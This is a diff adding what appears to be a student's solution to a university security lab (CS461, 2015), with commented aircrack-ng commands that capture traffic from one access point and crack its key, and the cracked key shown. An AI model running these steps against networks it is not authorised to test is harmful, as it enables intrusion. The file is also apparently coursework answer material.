@@ -1,0 +1,15 @@
+sudo ifconfig wlan0 down    		// bring down the wireless card first
+sudo iwconfig wlan0 mode monitor	// change the mode to monitor
+iwconfig				// verify the mode of the wireless card
+
+airodump-ng wlan0			// see all the networks that's running
+
+sudo airodump-ng -c 1 --bssid 00:0C:E6:9A:E3:C3 -w dump wlan0	// collect packets from 								a particular network
+
+aircrack-ng -b 00:0C:E6:9A:E3:C3 dump-01.cap dump-02.cap	// crack the password
+
+
+3.2.1.1 
+KEY FOUND! [ 43:53:34:36:31:46:61:6C:6C:32:30:31:35 ] (ASCII: CS461Fall2015 )
+Decrypted correctly: 100%
+
